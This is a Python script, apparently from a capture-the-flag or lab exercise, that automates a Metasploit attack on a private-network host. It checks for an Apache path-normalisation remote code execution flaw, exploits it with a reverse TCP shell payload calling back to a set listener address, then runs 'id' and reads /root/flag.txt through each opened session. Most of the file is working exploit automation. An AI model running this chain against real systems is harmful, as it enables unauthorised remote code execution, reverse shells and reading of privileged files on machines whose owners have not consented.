import json
import re
import sys

try:
    import framework_evidence
except Exception as exc:
    print(json.dumps({"error": "Could not import supplied framework_evidence helper", "detail": str(exc)}))
    sys.exit(1)

TARGET = "192.168.5.4"
LHOST = "192.168.0.5"  # Observed local interface address on the route to the target.
MODULE = "exploit/multi/http/apache_normalize_path_rce"
PAYLOAD = "linux/x64/shell/reverse_tcp"


def run_console(label, commands):
    argv = ["msfconsole", "-q", "-x", commands]
    try:
        envelope = framework_evidence.run_tool(argv)
    except Exception as exc:
        envelope = {"helper_error": str(exc), "requested_argv": argv}
    print(json.dumps({"step": label, "evidence": envelope}, ensure_ascii=False))
    return envelope


def collect_strings(value):
    if isinstance(value, str):
        return [value]
    if isinstance(value, dict):
        result = []
        for item in value.values():
            result.extend(collect_strings(item))
        return result
    if isinstance(value, list):
        result = []
        for item in value:
            result.extend(collect_strings(item))
        return result
    return []


def combined_output(envelope):
    return "\n".join(collect_strings(envelope))


base = (
    f"use {MODULE}; "
    f"set RHOSTS {TARGET}; "
    "set RPORT 80; "
    "set TARGETURI /; "
    f"set PAYLOAD {PAYLOAD}; "
    f"set LHOST {LHOST}; "
    "check; exit"
)
check_envelope = run_console("candidate_check", base)
check_text = combined_output(check_envelope)

affirmative = bool(
    re.search(r"the target appears to be vulnerable", check_text, re.IGNORECASE)
    or re.search(r"is vulnerable\b", check_text, re.IGNORECASE)
)
negative = bool(
    re.search(r"appears to be safe|target is not vulnerable|not vulnerable", check_text, re.IGNORECASE)
)
print(json.dumps({
    "assessment": "check_affirmatively_vulnerable" if affirmative else ("check_negative" if negative else "check_inconclusive_or_unrecognized"),
    "configured_candidate": {
        "module": MODULE,
        "RHOSTS": TARGET,
        "RPORT": "80",
        "TARGETURI": "/",
        "PAYLOAD": PAYLOAD,
        "LHOST": LHOST
    },
    "exploit_attempt_condition": "Only an affirmative vulnerability result triggers exploitation."
}, ensure_ascii=False))

if not affirmative:
    sys.exit(0)

exploit_commands = (
    f"use {MODULE}; "
    f"set RHOSTS {TARGET}; "
    "set RPORT 80; "
    "set TARGETURI /; "
    f"set PAYLOAD {PAYLOAD}; "
    f"set LHOST {LHOST}; "
    "exploit -z; sessions -l; exit"
)
exploit_envelope = run_console("justified_exploit_and_session_listing", exploit_commands)
exploit_text = combined_output(exploit_envelope)

session_ids = set(re.findall(r"Session\s+(\d+)\s+opened", exploit_text, re.IGNORECASE))
for line in exploit_text.splitlines():
    match = re.match(r"^\s*(\d+)\s+(?:shell|meterpreter)\s+", line, re.IGNORECASE)
    if match:
        session_ids.add(match.group(1))

if not session_ids:
    print(json.dumps({
        "session_assessment": "No session ID was identifiable in the captured exploit and session-list output; no flag-read command was issued.",
        "flag_contents_directly_observed": False
    }, ensure_ascii=False))
    sys.exit(0)

for session_id in sorted(session_ids, key=int):
    session_commands = (
        f'sessions -C "id" -i {session_id}; '
        f'sessions -C "cat /root/flag.txt" -i {session_id}; exit'
    )
    session_envelope = run_console(f"session_{session_id}_access_context_and_flag_read", session_commands)
    session_text = combined_output(session_envelope)
    print(json.dumps({
        "session_id": session_id,
        "access_context_command_attempted": "id",
        "flag_path_read_attempted": "/root/flag.txt",
        "flag_contents_directly_observed": bool(re.search(r"flag", session_text, re.IGNORECASE)),
        "note": "Review the retained raw Metasploit envelope to determine whether any displayed text is actually the flag contents; the keyword check alone is not proof."
    }, ensure_ascii=False))

